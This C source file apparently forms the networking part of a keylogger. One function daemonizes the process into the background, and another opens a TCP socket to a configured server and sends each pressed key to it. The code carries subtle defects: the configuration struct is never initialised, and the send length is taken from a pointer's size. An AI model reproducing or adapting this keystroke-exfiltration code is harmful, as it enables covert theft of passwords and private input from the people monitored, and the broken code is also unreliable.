#include "header.h"
#include "config.h"

void daemonize(void){
    syslog(LOG_NOTICE, "Entering Daemon");
    syslog (LOG_INFO, "Program started by User %d", getuid ());
    pid_t pid, sid;
    if (getppid() == 1) return; /* Already a daemon */
    pid = fork(); //Fork the Parent Process
    if (pid < 0) { syslog(LOG_ERR, "Can not create a new PID for our child process");}
    if (pid > 0) { exit(EXIT_SUCCESS); } /* We got a good pid, Close the Parent Process */
    umask(0); /* Change File Mask */
    sid = setsid(); /* Create a new Signature Id for our child */
    if (sid < 0) { syslog(LOG_ERR, "Can not create a new SID on child process");}
    if ((chdir("/")) < 0) { syslog(LOG_ERR, "Can not change directory on child process");}
    /* Close Standard File Descriptors: */
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void sendKey(char *keypressed){
    struct conf parms;
    /* configuration file */
    int sock;                        /* Socket descriptor */
    struct sockaddr_in echoServAddr; /* Echo server address */
    int value = 1;

    /* Create a reliable, stream socket using TCP */
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    /* Construct the server address structure */
    memset(&echoServAddr, 0, sizeof(echoServAddr));     /* Zero out structure */
    echoServAddr.sin_family      = AF_INET;             /* Internet address family */
    echoServAddr.sin_addr.s_addr = inet_addr(parms.ServerIP);   /* Server IP address */
    echoServAddr.sin_port        = htons(atoi(parms.ServerPort)); /* Server port */

    /* Establish the connection to the echo server */
    if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0)
            exit(0);

    if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&value, sizeof(int)) < 0)
            exit(0);

    /* Give the server a chance */
    usleep(1000);
      /* Send this */
      if (send(sock, keypressed, sizeof(keypressed), 0) != sizeof(keypressed))
            exit(0);
    close(sock);
}
